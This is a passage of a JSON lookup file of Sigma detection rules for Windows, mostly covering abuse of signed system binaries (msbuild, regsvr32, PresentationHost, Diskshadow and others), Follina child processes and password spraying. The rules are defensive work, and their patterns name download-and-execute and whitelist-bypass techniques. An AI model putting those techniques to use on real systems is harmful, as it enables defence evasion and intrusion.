                            "timestamp": "1645960728",
                            "uuid": "56cb2bd3-5525-46bd-a454-ea895a5b4d0d",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719",
                        "lookup_data": {
                            "description": "Detects execution of executables that can be used to bypass Applocker whitelisting",
                            "raw": "author: juju4\ndate: 2019/01/16\ndescription: Detects execution of executables that can be used to bypass Applocker\n  whitelisting\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - \\msdt.exe\n    - \\installutil.exe\n    - \\regsvcs.exe\n    - \\regasm.exe\n    - \\msbuild.exe\n    - \\ieexec.exe\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\n- Using installutil to add features for .NET applications (primarily would occur in\n  developer environments)\nid: 82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/09/01\nreferences:\n- https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt\n- https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1118\n- attack.t1218.004\n- attack.t1121\n- attack.t1218.009\n- attack.t1127\n- attack.t1127.001\n- attack.t1170\n- attack.t1218.005\n- attack.t1218\ntitle: Possible Applocker Bypass\n",
                            "sigma:id": "82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719",
                            "title": "Possible Applocker Bypass",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b124ddf4-778d-418e-907f-6dd3fc0d31cd",
                        "lookup_data": {
                            "description": "Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files to download arbitrary files",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/19\ndescription: Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\"\n  (Browser Applications) files to download arbitrary files\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - http://\n    - https://\n    - ftp://\n  selection_img:\n  - Image|endswith: \\presentationhost.exe\n  - OriginalFileName: PresentationHost.exe\nfalsepositives:\n- Unknown\nid: b124ddf4-778d-418e-907f-6dd3fc0d31cd\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/pull/239/files\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218\ntitle: Download Arbitrary Files Via PresentationHost.exe\n",
                            "sigma:id": "b124ddf4-778d-418e-907f-6dd3fc0d31cd",
                            "title": "Download Arbitrary Files Via PresentationHost.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0bbc6369-43e3-453d-9944-cae58821c173",
                        "lookup_data": {
                            "description": "Detects using WorkFolders.exe to execute an arbitrary control.exe",
                            "raw": "author: Maxime Thiebaut (@0xThiebaut)\ndate: 2021/10/21\ndescription: Detects using WorkFolders.exe to execute an arbitrary control.exe\ndetection:\n  condition: selection and not filter\n  filter:\n    Image: C:\\Windows\\System32\\control.exe\n  selection:\n    Image|endswith: \\control.exe\n    ParentImage|endswith: \\WorkFolders.exe\nfalsepositives:\n- Legitimate usage of the uncommon Windows Work Folders feature.\nid: 0bbc6369-43e3-453d-9944-cae58821c173\nlevel: high\nlogsource:\n  category: process_creation\n  definition: 'Requirements: Sysmon ProcessCreation logging must be activated'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/elliotkillick/status/1449812843772227588\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Execution via WorkFolders.exe\n",
                            "sigma:id": "0bbc6369-43e3-453d-9944-cae58821c173",
                            "title": "Execution via WorkFolders.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "459f2f98-397b-4a4a-9f47-6a5ec2f1c69d",
                        "lookup_data": {
                            "description": "Detects usage of \"MSOHTMED\" to download arbitrary files",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/19\ndescription: Detects usage of \"MSOHTMED\" to download arbitrary files\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - http://\n    - https://\n    - ftp://\n  selection_img:\n  - Image|endswith: \\MSOHTMED.exe\n  - OriginalFileName: MsoHtmEd.exe\nfalsepositives:\n- Unknown\nid: 459f2f98-397b-4a4a-9f47-6a5ec2f1c69d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/pull/238/files\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218\ntitle: Download Arbitrary Files Via MSOHTMED.EXE\n",
                            "sigma:id": "459f2f98-397b-4a4a-9f47-6a5ec2f1c69d",
                            "title": "Download Arbitrary Files Via MSOHTMED.EXE",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                        "lookup_data": {
                            "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)",
                            "raw": "author: Maxim Pavlunin\ndate: 2020/04/01\ndescription: Detects a suspicious child process of a Microsoft HTML Help system when\n  executing compiled HTML files (.chm)\ndetection:\n  condition: 1 of selection_*\n  selection_1:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\regsvr32.exe\n    - \\wmic.exe\n    - \\rundll32.exe\n    - \\MSHTA.EXE\n    - \\CertUtil.exe\n    - \\CertReq.exe\n    - \\MSbuild.exe\n    - \\installutil.exe\n    - \\schtasks.exe\n    - \\msiexec.exe\n    ParentImage:\n    - C:\\Windows\\hh.exe\n    - C:\\Windows\\SysWOW64\\hh.exe\n  selection_2:\n    CommandLine|contains:\n    - .application\n    - \\Downloads\\\n    - \\Content.Outlook\\\n    - \\AppData\\Local\\Temp\\\n    Image|endswith:\n    - \\Windows\\hh.exe\n    - \\Windows\\SysWOW64\\hh.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/24\nreferences:\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n- https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.001\n- attack.t1218.010\n- attack.t1218.011\n- attack.execution\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1047\n- attack.t1566\n- attack.t1566.001\n- attack.initial_access\n- attack.t1218\ntitle: HTML Help Shell Spawn\n",
                            "sigma:id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                            "title": "HTML Help Shell Spawn",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "28c8f68b-098d-45af-8d43-8089f3e35403",
                        "lookup_data": {
                            "description": "Detects when the registration of a VSS/VDS Provider as a COM+ application.",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/11/05\ndescription: Detects when the registration of a VSS/VDS Provider as a COM+ application.\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains: -register\n    Image|endswith: \\cscript.exe\n  selection2:\n    CommandLine|contains:\n    - \\Windows Kits\\10\\bin\\10.0.22000.0\\x64\n    - \\Windows Kits\\10\\bin\\10.0.19041.0\\x64\n    - \\Windows Kits\\10\\bin\\10.0.17763.0\\x64\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 28c8f68b-098d-45af-8d43-8089f3e35403\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/07\nreferences:\n- https://twitter.com/sblmsrsn/status/1456613494783160325?s=20\n- https://ss64.com/vb/cscript.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Registration via cscript.exe\n",
                            "sigma:id": "28c8f68b-098d-45af-8d43-8089f3e35403",
                            "title": "Suspicious Registration via cscript.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "90dcf730-1b71-4ae7-9ffc-6fcf62bd0132",
                        "lookup_data": {
                            "description": "ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.",
                            "raw": "author: frack113\ndate: 2021/11/07\ndescription: ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into\n  a password-protected zip file.\ndetection:\n  condition: run or delete\n  delete:\n    CommandLine|contains|all:\n    - /delete\n    - Microsoft_Windows_Shell_ZipFolder:filename=\n    - .zip\n  run:\n    CommandLine|contains|all:\n    - /generic:Microsoft_Windows_Shell_ZipFolder:filename=\n    - .zip\n    - '/pass:'\n    - '/user:'\nfalsepositives:\n- Unknown\nid: 90dcf730-1b71-4ae7-9ffc-6fcf62bd0132\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/SBousseaden/status/1451237393017839616\n- https://github.com/Tylous/ZipExec\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: Suspicious ZipExec Execution\n",
                            "sigma:id": "90dcf730-1b71-4ae7-9ffc-6fcf62bd0132",
                            "title": "Suspicious ZipExec Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cec8e918-30f7-4e2d-9bfa-a59cc97ae60f",
                        "lookup_data": {
                            "description": "The OpenWith.exe executes other binary",
                            "raw": "author: Beyu Denis, oscd.community (rule), @harr0ey (idea)\ndate: 2019/10/12\ndescription: The OpenWith.exe executes other binary\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: /c\n    Image|endswith: \\OpenWith.exe\nfalsepositives:\n- Legitimate use of OpenWith.exe by legitimate user\nid: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OSBinaries/Openwith.yml\n- https://twitter.com/harr0ey/status/991670870384021504\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: OpenWith.exe Executes Specified Binary\n",
                            "sigma:id": "cec8e918-30f7-4e2d-9bfa-a59cc97ae60f",
                            "title": "OpenWith.exe Executes Specified Binary",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f3d39c45-de1a-4486-a687-ab126124f744",
                        "lookup_data": {
                            "description": "Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190)",
                            "raw": "author: Nextron Systems\ndate: 2022/06/01\ndescription: Detects sdiagnhost.exe calling a suspicious child process (e.g. used\n  in exploits for Follina / CVE-2022-30190)\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n    - \\mshta.exe\n    - \\cscript.exe\n    - \\wscript.exe\n    - \\taskkill.exe\n    - \\regsvr32.exe\n    - \\rundll32.exe\n    - \\calc.exe\n    ParentImage|endswith: \\sdiagnhost.exe\nfalsepositives:\n- Unknown\nid: f3d39c45-de1a-4486-a687-ab126124f744\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/31\nreferences:\n- https://twitter.com/nao_sec/status/1530196847679401984\n- https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\n- https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n- https://app.any.run/tasks/c4117d9a-f463-461a-b90f-4cd258746798/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1218\ntitle: Sdiagnhost Calling Suspicious Child Process\n",
                            "sigma:id": "f3d39c45-de1a-4486-a687-ab126124f744",
                            "title": "Sdiagnhost Calling Suspicious Child Process",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ce7cf472-6fcc-490a-9481-3786840b5d9b",
                        "lookup_data": {
                            "description": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.",
                            "raw": "author: frack113\ndate: 2021/07/13\ndescription: Executes SCT script using scrobj.dll from a command in entered into a\n  specially prepared INF file.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - 'InfDefaultInstall.exe '\n    - '.inf'\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: ce7cf472-6fcc-490a-9481-3786840b5d9b\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution\n- https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: InfDefaultInstall.exe .inf Execution\n",
                            "sigma:id": "ce7cf472-6fcc-490a-9481-3786840b5d9b",
                            "title": "InfDefaultInstall.exe .inf Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "643bdcac-8b82-49f4-9fd9-25a90b929f3b",
                        "lookup_data": {
                            "description": "Detects the execution of a renamed meg.exe of MegaSync during incident response engagements associated with ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.",
                            "raw": "author: Sittikorn S\ndate: 2021/06/22\ndescription: Detects the execution of a renamed meg.exe of MegaSync during incident\n  response engagements associated with ransomware families like Nefilim, Sodinokibi,\n  Pysa, and Conti.\ndetection:\n  condition: selection_proc or ( selection_orig and not filter )\n  filter:\n    Image|endswith: \\meg.exe\n  selection_orig:\n    OriginalFileName: meg.exe\n  selection_proc:\n    CommandLine|contains: C:\\Windows\\Temp\\meg.exe\n    ParentImage|endswith: \\explorer.exe\nfalsepositives:\n- Software that illegaly integrates MegaSync in a renamed form\n- Administrators that have renamed MegaSync\nid: 643bdcac-8b82-49f4-9fd9-25a90b929f3b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://redcanary.com/blog/rclone-mega-extortion/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Renamed MegaSync\n",
                            "sigma:id": "643bdcac-8b82-49f4-9fd9-25a90b929f3b",
                            "title": "Renamed MegaSync",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0c2f8629-7129-4a8a-9897-7e0768f13ff2",
                        "lookup_data": {
                            "description": "Detects using Diskshadow.exe to execute arbitrary code in text file",
                            "raw": "author: Ivan Dyachkov, oscd.community\ndate: 2020/10/07\ndescription: Detects using Diskshadow.exe to execute arbitrary code in text file\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - /s\n    - -s\n    Image|endswith: \\diskshadow.exe\nfalsepositives:\n- False postitve can be if administrators use diskshadow tool in their infrastructure\n  as a main backup tool with scripts.\nfields:\n- CommandLine\nid: 0c2f8629-7129-4a8a-9897-7e0768f13ff2\nlevel: high\nlogsource:\n  category: process_creation\n  definition: 'Requirements: Sysmon ProcessCreation logging must be activated and\n    Windows audit must Include command line in process creation events'\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\nstatus: test\ntags:\n- attack.execution\n- attack.t1218\ntitle: Execution via Diskshadow.exe\n",
                            "sigma:id": "0c2f8629-7129-4a8a-9897-7e0768f13ff2",
                            "title": "Execution via Diskshadow.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9c7e131a-0f2c-4ae0-9d43-b04f4e266d43",
                        "lookup_data": {
                            "description": "Application Virtualization Utility is included with Microsoft Office. We are able to abuse \"AppVLP\" to execute shell commands.\nNormally, this binary is used for Application Virtualization, but we can use it as an abuse binary to circumvent the ASR file path rule folder\nor to mark a file as a system file.\n",
                            "raw": "author: Sreeman\ndate: 2020/03/13\ndescription: 'Application Virtualization Utility is included with Microsoft Office.\n  We are able to abuse \"AppVLP\" to execute shell commands.\n\n  Normally, this binary is used for Application Virtualization, but we can use it\n  as an abuse binary to circumvent the ASR file path rule folder\n\n  or to mark a file as a system file.\n\n  '\ndetection:\n  condition: selection and not filter\n  filter:\n    Image|endswith:\n    - \\msoasb.exe\n    - \\rundll32.exe\n  selection:\n    ParentImage|endswith: \\appvlp.exe\nfalsepositives:\n- Unknown\nid: 9c7e131a-0f2c-4ae0-9d43-b04f4e266d43\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/29\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/\nstatus: experimental\ntags:\n- attack.t1218\n- attack.defense_evasion\n- attack.execution\ntitle: Using AppVLP To Circumvent ASR File Path Rule\n",
                            "sigma:id": "9c7e131a-0f2c-4ae0-9d43-b04f4e266d43",
                            "title": "Using AppVLP To Circumvent ASR File Path Rule",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d06be4b9-8045-428b-a567-740a26d9db25",
                        "lookup_data": {
                            "description": "Detects when verclsid.exe is used to run COM object via GUID",
                            "raw": "author: Victor Sergeev, oscd.community\ndate: 2020/10/09\ndescription: Detects when verclsid.exe is used to run COM object via GUID\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - /S\n    - /C\n  selection_img:\n  - Image|endswith: \\verclsid.exe\n  - OriginalFileName: verclsid.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: d06be4b9-8045-428b-a567-740a26d9db25\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Verclsid/\n- https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5\n- https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Verclsid.exe Runs COM Object\n",
                            "sigma:id": "d06be4b9-8045-428b-a567-740a26d9db25",
                            "title": "Verclsid.exe Runs COM Object",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "60f16a96-db70-42eb-8f76-16763e333590",
                        "lookup_data": {
                            "description": "Detects execution of of Dxcap.exe",
                            "raw": "author: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019/10/26\ndescription: Detects execution of of Dxcap.exe\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains: ' -c '\n  selection_img:\n  - Image|endswith: \\DXCap.exe\n  - OriginalFileName: DXCap.exe\nfalsepositives:\n- Legitimate execution of dxcap.exe by legitimate user\nid: 60f16a96-db70-42eb-8f76-16763e333590\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/09\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/\n- https://twitter.com/harr0ey/status/992008180904419328\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Application Whitelisting Bypass via Dxcap.exe\n",
                            "sigma:id": "60f16a96-db70-42eb-8f76-16763e333590",
                            "title": "Application Whitelisting Bypass via Dxcap.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5a3164f2-b373-4152-93cf-090b13c12d27",
                        "lookup_data": {
                            "description": "Detects uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process. This could indicate an attempt of persistence via VsCode tasks or terminal profiles.",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/26\ndescription: Detects uncommon or suspicious child processes spawning from a VsCode\n  \"code.exe\" process. This could indicate an attempt of persistence via VsCode tasks\n  or terminal profiles.\ndetection:\n  condition: selection_parent and 1 of selection_children_*\n  selection_children_cli:\n    CommandLine|contains:\n    - Invoke-Expressions\n    - IEX\n    - Invoke-Command\n    - ICM\n    - DownloadString\n    - rundll32\n    - regsvr32\n    - wscript\n    - cscript\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n  selection_children_images:\n    Image|endswith:\n    - \\calc.exe\n    - \\regsvr32.exe\n    - \\rundll32.exe\n    - \\cscript.exe\n    - \\wscript.exe\n  selection_children_paths:\n    Image|contains:\n    - C:\\Users\\Public\\\n    - C:\\Windows\\Temp\\\n    - C:\\Temp\\\n  selection_parent:\n    ParentImage|endswith: \\code.exe\nfalsepositives:\n- In development environment where VsCode is used heavily. False positives may occure\n  when developers use task to compile or execute different types of code. Remove or\n  add processes accordingly\nid: 5a3164f2-b373-4152-93cf-090b13c12d27\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/nas_bench/status/1618021838407495681\n- https://twitter.com/nas_bench/status/1618021415852335105\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: VsCode Child Process Anomaly\n",
                            "sigma:id": "5a3164f2-b373-4152-93cf-090b13c12d27",
                            "title": "VsCode Child Process Anomaly",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "36475a7d-0f6d-4dce-9b01-6aeb473bbaf1",
                        "lookup_data": {
                            "description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs",
                            "raw": "author: frack113\ndate: 2021/07/16\ndescription: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - \\SyncAppvPublishingServer.vbs\n    - ;\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/22\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\n- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1216\ntitle: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code\n",
                            "sigma:id": "36475a7d-0f6d-4dce-9b01-6aeb473bbaf1",
                            "title": "SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
                        "lookup_data": {
                            "description": "Malware analysis report on SparrowDoor malware",
                            "link": "http://www.botvrij.eu/data/feed-osint/827e941e-4a99-4e2c-a578-bfcec2d40552.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1650959349",
                            "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "104cdb48-a7a8-4ca7-a453-32942c6e5dcb",
                        "lookup_data": {
                            "description": "Detects usage of \"ProtocolHandler\" to download files. Downloaded files will be located in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)",
                            "raw": "author: frack113\ndate: 2021/07/13\ndescription: Detects usage of \"ProtocolHandler\" to download files. Downloaded files\n  will be located in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)\ndetection:\n  condition: selection_img and 1 of selection_cli_*\n  selection_cli_1:\n    CommandLine|contains|all:\n    - '\"ms-word'\n    - .docx\"\n  selection_cli_2:\n    CommandLine|contains: ' http'\n  selection_img:\n  - Image|endswith: \\protocolhandler.exe\n  - OriginalFileName: ProtocolHandler.exe\nfalsepositives:\n- Unknown\nid: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: File Download Using ProtocolHandler.exe\n",
                            "sigma:id": "104cdb48-a7a8-4ca7-a453-32942c6e5dcb",
                            "title": "File Download Using ProtocolHandler.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6",
                        "lookup_data": {
                            "description": "The Devtoolslauncher.exe executes other binary",
                            "raw": "author: Beyu Denis, oscd.community (rule), @_felamos (idea)\ndate: 2019/10/12\ndescription: The Devtoolslauncher.exe executes other binary\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: LaunchForDeploy\n    Image|endswith: \\devtoolslauncher.exe\nfalsepositives:\n- Legitimate use of devtoolslauncher.exe by legitimate user\nid: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/\n- https://twitter.com/_felamos/status/1179811992841797632\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Devtoolslauncher.exe Executes Specified Binary\n",
                            "sigma:id": "cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6",
                            "title": "Devtoolslauncher.exe Executes Specified Binary",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6004abd0-afa4-4557-ba90-49d172e0a299",
                        "lookup_data": {
                            "description": "Detects indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/06/13\ndescription: Detects indirect command execution via Program Compatibility Assistant\n  \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: ../\n    Image|endswith: \\pcwrun.exe\nfalsepositives:\n- Unlikely\nid: 6004abd0-afa4-4557-ba90-49d172e0a299\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/nas_bench/status/1535663791362519040\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.execution\ntitle: Execute Pcwrun.EXE To Leverage Follina\n",
                            "sigma:id": "6004abd0-afa4-4557-ba90-49d172e0a299",
                            "title": "Execute Pcwrun.EXE To Leverage Follina",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "409f8a98-4496-4aaa-818a-c931c0a8b832",
                        "lookup_data": {
                            "description": "This rule detects suspicious files created by Microsoft Sync Center (mobsync)",
                            "raw": "author: elhoim\ndate: 2022/04/28\ndescription: This rule detects suspicious files created by Microsoft Sync Center (mobsync)\ndetection:\n  condition: selection_mobsync and filter_created_file\n  filter_created_file:\n    TargetFilename|endswith:\n    - .dll\n    - .exe\n  selection_mobsync:\n    Image|endswith: \\mobsync.exe\nfalsepositives:\n- Unknown\nid: 409f8a98-4496-4aaa-818a-c931c0a8b832\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/06/02\nreferences:\n- https://redcanary.com/blog/intelligence-insights-november-2021/\nstatus: experimental\ntags:\n- attack.t1055\n- attack.t1218\n- attack.execution\n- attack.defense_evasion\ntitle: Created Files by Microsoft Sync Center\n",
                            "sigma:id": "409f8a98-4496-4aaa-818a-c931c0a8b832",
                            "title": "Created Files by Microsoft Sync Center",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bac9fb54-2da7-44e9-988f-11e9a5edbc0c",
                        "lookup_data": {
                            "description": "Detects possible password spraying attempts using Dsacls",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/06/20\ndescription: Detects possible password spraying attempts using Dsacls\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains|all:\n    - '/user:'\n    - '/passwd:'\n  selection_img:\n  - Image|endswith: \\dsacls.exe\n  - OriginalFileName: DSACLS.EXE\nfalsepositives:\n- Legitimate use of dsacls to bind to an LDAP session\nid: bac9fb54-2da7-44e9-988f-11e9a5edbc0c\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions#password-spraying-anyone\n- https://ss64.com/nt/dsacls.html\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1218\ntitle: Password Spraying Attempts Using Dsacls\n",
                            "sigma:id": "bac9fb54-2da7-44e9-988f-11e9a5edbc0c",
                            "title": "Password Spraying Attempts Using Dsacls",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6f535e01-ca1f-40be-ab8d-45b19c0c8b7f",
